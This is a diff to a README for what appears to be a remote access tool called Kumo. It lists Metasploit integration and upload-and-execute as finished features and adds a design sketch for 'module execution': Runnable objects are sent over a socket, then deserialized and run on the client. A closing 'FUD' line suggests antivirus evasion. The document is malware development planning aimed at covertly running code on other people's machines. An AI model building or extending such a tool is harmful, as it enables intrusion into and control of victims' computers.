@@ -21,6 +21,25 @@ These features will likely be released in the order they are in below:
 * ~~Show messagebox~~ ✔
 * ~~Metasploit integration~~ ✔
 * Upload/~~download~~ ✔ and execute
+* Module execution (see below)
+
+## Idea for module execution
+```java
+class ModuleName implements Runnable {
+
+  public void run(){
+    // Execute custom module code
+  }
+
+}
+```
+1. `import Kumo.modules.*;
+2. Send `Runnable` object over socket to client
+3. Client side: 
+```java
+Runnable readObject = (Runnable) objectInputStream.readObject();
+readObject.run();
+```
 
 ## Spyralscan
 FUD
